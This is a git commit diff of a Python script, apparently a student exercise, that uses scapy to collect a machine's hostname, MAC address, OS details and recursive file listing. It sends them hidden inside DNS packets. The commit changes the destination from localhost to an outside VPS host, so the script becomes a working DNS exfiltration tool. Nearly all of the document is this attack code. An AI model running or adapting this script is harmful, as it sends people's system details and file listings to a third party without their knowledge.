a9d07620ffb20b3d67f0cd6137b8c93ef8f74db7
lucasreq <lucas.requena@ynov.com>
2020-02-28 13:08:04 +0100

    beautifulise + last version

--- crafting.py
+++ crafting.py
@@ -2,7 +2,9 @@
 
 # Libraries
 from scapy.all import *
-from uuid import getnode as get_mac
+import platform
+import os
+import getmac
 import socket
 import urllib.request as urllib2
 from json import load
@@ -14,50 +16,44 @@ except ImportError:
 # ==========================================================================================
 
 # System informations
-opesys = os.uname()
+try:
+    opesys = platform.uname()
+except NameError:
+    opesys = os.uname()
 
 system = opesys[0]
 user = opesys[1]
 distrib = opesys[2]
 # get public ip address
-my_ip = load(urllib2.urlopen('http://jsonip.com'))['ip']
 # Mac address
-macaddr = hex(get_mac())
-
-IP_h = "127.0.0.1"
-
-test = [user,macaddr,system,distrib,my_ip]
+macaddr = getmac.get_mac_address()
 
 # ===========================================================================================
 # Functions
 
 def exfiltration(data):
     # Data exfiltration
-	send (IP(dst="127.0.0.1") / UDP() / DNS(qd=DNSQR(
-    qname="localhost", qtype="A"))/data)
+	send(IP(dst="vps778212.ovh.net") / UDP() / DNS(qd=DNSQR(
+    qname="73a94e9217810f490cff289694d0e538", qtype="A"))/data)
 	print(i)
  
 def scantree(path):
-    """Recursively yield DirEntry objects for given directory."""
+    #"""Recursively yield DirEntry objects for given directory."""
     for entry in scandir(path):
         if entry.is_dir(follow_symlinks=False):
             yield from scantree(entry.path)
         else:
             yield entry
 
-
-for i in test:
-	exfiltration(i)
-	print(i)
-scantree(".")
-
-
 if __name__ == '__main__':
     import sys
     
     tree = ""
     for entry in scantree(sys.argv[1] if len(sys.argv) > 1 else '.'):
-        tree += str(entry.path) + "\n"
-        
-    exfiltration(tree)
-    print(tree)
+        tree += "  \n  " + str(entry.path)
+    
+    test = [user,macaddr,system,distrib,tree]
+    scantree(".")
+    
+    for i in test:
+	    exfiltration(i)
